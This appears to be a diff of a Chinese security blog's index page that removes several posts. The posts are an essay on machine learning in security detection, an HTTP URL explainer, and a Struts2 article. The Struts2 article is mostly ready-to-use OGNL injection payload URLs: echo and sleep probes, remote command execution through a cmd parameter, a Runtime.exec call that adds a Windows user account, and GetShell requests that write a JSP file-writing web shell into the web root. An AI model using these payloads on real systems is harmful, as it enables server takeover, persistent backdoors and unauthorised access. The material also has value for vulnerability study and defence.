-<h4 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h4><p>我有一个固定的数据集合集，我有一个模型套上去，我先做一个模型，然后我有检测结果。严重依赖与我们的安全专家，提供精确的数据标签。我需要不断的再把它的结果打上标签，再去逐步做验证，它其实是一个人工辅助的过程。<br>机器学习和以前的规则系统不大一样，以前的规则系统是安全研究员就能搞定的事情。但是在机器学习的场景下，是需要安全专家和数据科学家共同协作的。<br>其实在机器学习的场景下，你会发现安全专家起到的作用要比数据科学家要重一点，因为它里面有一个特征提取的过程，这个特征提取是很严重的依赖于你的专家先验知识的，这些特征提取是数据科学家解决不了的一个问题。<br>机器学习就是它在固定数据集的时候，效果特别好，输入、输出严格限定的话，效果绝对要比规则系统强很多。<br>数据处理要比你的规则系统要强，因为它是天然的和大数据这套东西都结合起来的。<br>但是第二个就有待商榷，它落地的时候这个误报率，第一步它在训练的时候那个指标特别好看，但是安全每天的形势都是在变的，今天你做的四个九、五个九的模型，明天来了一个新的东西，你会发现他以前没考虑到，有误报。这个误报就不是简单的0.001%的标准，很可能放大到一个你没有做运营的场景。<br>在一个规则系统里面，你如果要做误报，这个响应是相对比较容易的，我就删一条规则嘛，大不了加个强限制的的条件。机器学习的时候，你看这个模型是人一眼看上去理解不了的，需要很精确的、很深入的做关联，才能理解机器学习的模型，就意味着你不能通过一个简单的把一个分支改掉的方式解决问题，得需要把模型重新迭代一遍，迭代模型大家做过的都知道，周期是比较长的了。<br>最后一个是它的威胁分类比较困难。</p>
-<h4 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h4><p>它在解决大局观的问题下，要比人的性能要好。那我们给它一个定位，它尝试在解决一个已知的未知的问题，它能比机器学习解决得更好。但是它也在尝试着突破未知的未知，这个可能比较难理解，我们后面也展开说一下。<br>它还是严重的依赖专家，给你提供一个初始的数据集用来做标签，用来做结果验证。但是你会明显感觉到，如果大家在说神经网络的时候，你会发现专家的分量降低了，算法和计算或者是模型的层次会变高了。那就变成一个数据科学家主导的过程，而不是专家主导的过程，专家更多是去辅助验证这个模型。<br>深度学习和机器学习都有同样的问题，但是因为它的更不可控性或者是更不理解性，所以就造成了和机器学习有同样的问题，但是会相对比更严重。</p>
-<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>特定场景的检测，就是固定输入输出，有固定的规则系统。在固定场景的情况下，还是有很大的潜力去发现已知的未知，甚至于去发现一些未知的未知，这些特定场景我们前面也提到了有一些问题，比如说误报的问题、漏报的问题，也是通过一个运营的方式去解决，但是运营的方和我们以前常见的不一样，我们杀毒软件来了误报了以后，我们都是分析师去处理的，但是在机器学习、人工智能这个大框架下，是通过数据密集型的逻辑去解决的。<br>多维度中的一个维度，因为我们前面提到的，机器学习和深度学习最大的问题可能在落地的时候是有误报的问题和时效性的问题，在泛安全的场景下，其实还有很多场景不需要这么强的对误报的容忍度或者是漏报的容忍度那么低的。而且在大的体系下是只依赖于一个东西做某些程度的决策，而不是要求你做百分百的决策。<br>实时对抗性没那么强。这些场景大家都相对比较熟悉了，就是风控，风控包括人脸识别、用户粗向、策略模型，你会发现在某一个子方向上确实没有程度做到一个我们可以直接拿过来做单一维度的对抗手段，但是你把所有的这些东西综合在一起，因为风控讲的是可控，我们如果是搞攻防对抗的，你有一起安全事故很可能被搞了，但是风控在大的场景下，只有一个百分比的用户的损失是可以接受的，我就是相对比较成功的，所以在这种场景应用是很成功的。<br>威胁情报，很多人可能喜欢把威胁情报归到检测里面去，但是我觉得不是，它主要还是解决知己知彼的问题，在知己知彼的场景下，它其实是可以通过人工后期确认的方式，来达到你要的效果。所以在这个场景下它也没有那么高的实时对抗性的误报的要求。<br>最常见的，后台数据处理，批量数据分析包括聚类、分类这些应用，可能每家都有很成功的应用。</p>
-<h4 id="未知的未知"><a href="#未知的未知" class="headerlink" title="未知的未知"></a>未知的未知</h4><p>未知的未知我们到底怎么解决，是我们现在相对比较前沿的在人工智能方向上的一个，AlphaGo里面用的那套模型，就是Reinforcement  Learning，里面有一个反馈机制，我觉得人工智能的路还很长，但是这些跬步都是一步步积累下来的，我们虽然看不到人工智能在信息安全或者是其他行业的终局，但是能看到的就是Reinforcement  Learning在下一步的人工智能里面相对迭代效果还不错的。<br>如果要落地的话，你会发现数据的重要性远远大于其他所有方面。<br>没有数据就没有大数据，没有大数据就没有人工智能，也没有机器学习。<br>模型，大家有时候可能觉得模型和算法是一套东西，模型在我们的概念就是一个威胁场景，必须要定义好你要解决什么样的问题，在这种情况下用算法适配，而不是反过来。所以我们自己的概念是说数据大于模型，模型大于算法。我们自己切身的体验是，你如果按照这个走的话，你的落地的效果肯定会多一些。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/08/11/机器学习再信息安全中的应用/" data-id="cjc7iqrrv000p5s1bfi8ysz62" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-解密Struts2-POC" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/07/18/解密Struts2-POC/" class="article-date">
-  <time datetime="2017-07-18T07:44:42.000Z" itemprop="datePublished">2017-07-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/07/18/解密Struts2-POC/">解密Struts2 POC</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>struts的威力大家都知道，这里找几个有代表性的POC讲一下，做一个记录。</p>
-<p>#####回显POC<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(g)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i2)((<span class="string">'\43xman.getWriter().println(%22[/ok]%22)'</span>)(d))&amp;(i99)((<span class="string">'\43xman.getWriter().close()'</span>)(d))</div></pre></td></tr></table></figure></p>
-<p>poc2（类型转换漏洞需要把POC加在整型参数上）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))%2b'</span></div></pre></td></tr></table></figure></p>
-<p>poc3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(<span class="literal">true</span>),@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))&amp;z[(foo)(<span class="string">'meh'</span>)]=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
-<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%22[/ok]%22),%23s3cur1ty.close())(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]</div></pre></td></tr></table></figure></p>
-<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23response=@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22),%23response.close()&#125;</span></div></pre></td></tr></table></figure></p>
-<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/$%7B%23_memberAccess[%22allowStaticMethodAccess%22]=<span class="literal">true</span>,%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23resp.println(%22[ok]%22),%23resp.close()%7D.action</div></pre></td></tr></table></figure></p>
-<p>poc7<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/Struts2/test.action?redirect:<span class="variable">$&#123;%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()&#125;</span></div></pre></td></tr></table></figure></p>
-<p>@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22)其实是静态调用ServletActionContext; ServletActionContext能够拿到真正的HttpServletRequest、HttpServletResponse、ServletContext。拿到一个HttpServletResponse响应对象后就可以调用getWriter方法(返回的是PrintWriter)让Servlet容器上输出[/ok]了，而其他的POC也都做了同样的事：拿到HttpServletResponse，然后输出[/ok]。其中的allowStaticMethodAccess在Struts2里面默认是false，也就是默认不允许静态方法调用。</p>
-<p>#####精确判断是否存在（延迟判断）:<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(d)((<span class="string">'@java.lang.Thread@sleep(5000)'</span>)(d))</div></pre></td></tr></table></figure></p>
-<p>poc2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000))%2b'</span></div></pre></td></tr></table></figure></p>
-<p>poc3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,@java.lang.Thread@sleep(5000))(meh%29&amp;z[%28foo%29%28%27meh%27%29]=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
-<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean(<span class="literal">false</span>)%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c+%23a%3d%40java.lang.Thread@sleep(5000))(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]</div></pre></td></tr></table></figure></p>
-<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)&#125;</span></div></pre></td></tr></table></figure></p>
-<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)&#125;</span>.action</div></pre></td></tr></table></figure></p>
-<p>之前很多的利用工具都是让线程睡一段时间再去计算时间差来判断漏洞是否存在。这样比之前的回显更靠谱，缺点就是慢。而实现这个POC的方法同样是非常的简单其实就是静态调用java.lang.Thread.sleep(5000)就行了。而命令执行原理也是一样的。</p>
-<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>关于回显：webStr\75new\40byte[100] 修改为合适的长度。<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(g)((<span class="string">'\43req\75@org.apache.struts2.ServletActionContext@getRequest()'</span>)(d))&amp;(h)((<span class="string">'\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter(%22cmd%22))'</span>)(d))&amp;(i)((<span class="string">'\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())'</span>)(d))&amp;(i01)((<span class="string">'\43webStr\75new\40byte[100]'</span>)(d))&amp;(i1)((<span class="string">'\43webRootzproreader.readFully(\43webStr)'</span>)(d))&amp;(i111)(<span class="string">'\43webStr12\75new\40java.lang.String(\43webStr)'</span>)(d))&amp;(i2)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i2)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i95)((<span class="string">'\43xman.getWriter().println(\43webStr12)'</span>)(d))&amp;(i99)((<span class="string">'\43xman.getWriter().close()'</span>)(d))&amp;cmd=cmd%20/c%20ipconfig</div></pre></td></tr></table></figure></p>
-<p>poc2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[100],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))%2b'</span>&amp;cmd=cmd%20/c%20ipconfig</div></pre></td></tr></table></figure></p>
-<p>poc3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/freecms/login_login.do?user.loginname=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(<span class="literal">true</span>),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().<span class="built_in">exec</span>(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))&amp;z[(user.loginname)(<span class="string">'meh'</span>)]=<span class="literal">true</span>&amp;cmd=cmd%20/c%20set</div></pre></td></tr></table></figure></p>
-<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23a=%40java.lang.Runtime%40getRuntime().<span class="built_in">exec</span>(%23req.getParameter(%22cmd%22)).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char%5b50000%5d,%23c.read(%23d),%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%23d),%23s3cur1ty.close())(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]&amp;cmd=cmd%20/c%20netstat%20-an</div></pre></td></tr></table></figure></p>
-<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result),%23response.close()&#125;</span>&amp;cmd=cmd%20/c%20set</div></pre></td></tr></table></figure></p>
-<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/struts2-blank/example/HelloWorld.action?redirect:<span class="variable">$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;'netstat','-an'&#125;</span>)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(<span class="string">'com.opensymphony.xwork2.dispatcher.HttpServletResponse'</span>),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</div></pre></td></tr></table></figure></p>
-<p>其实在Java里面要去执行一个命令的方式都是一样的，简单的静态调用方式<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">"net user selina 123 /add"</span>);</div></pre></td></tr></table></figure></p>
-<p>就可以执行任意命令了。Exec执行后返回的类型是java.lang.Process。Process是一个抽象类，final class ProcessImpl extends Process也是Process的具体实现。而命令执行后返回的Process可以通过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">public OutputStream getOutputStream()</div><div class="line">public InputStream getInputStream()</div></pre></td></tr></table></figure></p>
-<p>直接输入输出流，拿到InputStream之后直接读取就能够获取到命令执行的结果了。而在Ognl里面不能够用正常的方式去读取流，而多是用DataInputStream的readFully或BufferedReader的read方法全部读取或者按byte读取的。因为可能会读取到半个中文字符，所以可能会存在乱码问题，自定义每次要读取的大小就可以了。POC当中的/c 不是必须的，执行dir之类的命令可以加上。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Process java.lang.Runtime.exec(String <span class="built_in">command</span>) throws IOException</div></pre></td></tr></table></figure></p>
-<p>#####GetShell<br>poc1:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\u0023_memberAccess[\'</span>allowStaticMethodAccess\<span class="string">']'</span>)(meh)=<span class="literal">true</span>&amp;(aaa)((<span class="string">'\u0023context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\u003d\u0023foo'</span>)(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&amp;(i1)((<span class="string">'\43req\75@org.apache.struts2.ServletActionContext@getRequest()'</span>)(d))&amp;(i12)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i13)((<span class="string">'\43xman.getWriter().println(\43req.getServletContext().getRealPath(%22\u005c%22))'</span>)(d))&amp;(i2)((<span class="string">'\43fos\75new\40java.io.FileOutputStream(new\40java.lang.StringBuilder(\43req.getRealPath(%22\u005c%22)).append(@java.io.File@separator).append(%22css3.jsp%22).toString())'</span>)(d))&amp;(i3)((<span class="string">'\43fos.write(\43req.getParameter(%22p%22).getBytes())'</span>)(d))&amp;(i4)((<span class="string">'\43fos.close()'</span>)(d))&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
-<p>poc2（类型转换漏洞需要把POC加在整型参数上）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())%2b'</span>%20&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
-<p>poc3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close())(meh%29&amp;z[%28foo%29%28%27meh%27%29]=<span class="literal">true</span>&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
-<p>poc4:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
-<p>poc5:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),new+java.io.BufferedWriter(new+java.io.FileWriter(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22)).append(%23req.getParameter(%22p%22)).close()&#125;</span>&amp;p=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
-<p>poc6:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/Struts2/test.action?redirect:<span class="variable">$&#123;%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22css3.jsp%22).replaceAll("\\\\", "/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()&#125;</span>&amp;c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e</div></pre></td></tr></table></figure></p>
-<p>比如POC4当中首先就是把allowStaticMethodAccess改为trute即允许静态方法访问。然后再获取请求对象，从请求对象中获取网站项目的根路径，然后在根目录下新建一个css3.jsp，而css3.jsp的内容同样来自于客户端的请求。POC4中的p就是传入的参数，只要获取p就能获取到内容完成文件的写入了。之前已经说过Java不是动态的脚本语言，所以没有eval。不能像PHP那样直接用eval去动态执行，所以Java里面没有真正意义上的一句话木马。菜刀只是提供了一些常用的一句话的功能的具体的实现，所以菜刀的代码会很长，因为这些代码在有eval的情况下是可以通过发送请求的形式去构造的，在这里就必须把代码给上传到服务器去编译成执行。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/07/18/解密Struts2-POC/" data-id="cjc7iqrs9000t5s1bbnwn1tcs" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="w-各行业常见漏洞测试点总结" class="article article-type-w" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2017/02/27/各行业常见漏洞测试点总结/" class="article-date">
-  <time datetime="2017-02-27T05:39:46.000Z" itemprop="datePublished">2017-02-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/02/27/各行业常见漏洞测试点总结/">各行业常见漏洞测试点总结</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="http://blkstone.github.io/2017/10/14/common-web-vulns/" target="_blank" rel="external">转</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/02/27/各行业常见漏洞测试点总结/" data-id="cjc7iqrrs000k5s1broupdttw" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
   
     <article id="post-任意文件读取漏洞的利用" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
@@ -314,123 +114,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2017/01/27/任意文件读取漏洞的利用/" data-id="cjc7iqrrp000i5s1bqofe8haj" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-HTTP-协议" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/12/23/HTTP-协议/" class="article-date">
-  <time datetime="2016-12-23T05:15:58.000Z" itemprop="datePublished">2016-12-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/23/HTTP-协议/">HTTP 协议</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://www.jianshu.com/p/80e25cb1d81a" target="_blank" rel="external">转</a></p>
-<h4 id="详解URL的组成"><a href="#详解URL的组成" class="headerlink" title="详解URL的组成"></a>详解URL的组成</h4><p>就以下面这个URL为例，介绍下普通URL的各部分组成</p>
-<p><a href="http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name" target="_blank" rel="external">http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name</a><br>从上面的URL可以看出，一个完整的URL包括以下几部分：<br><strong>1.</strong>协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符</p>
-<p><strong>2.</strong>域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用</p>
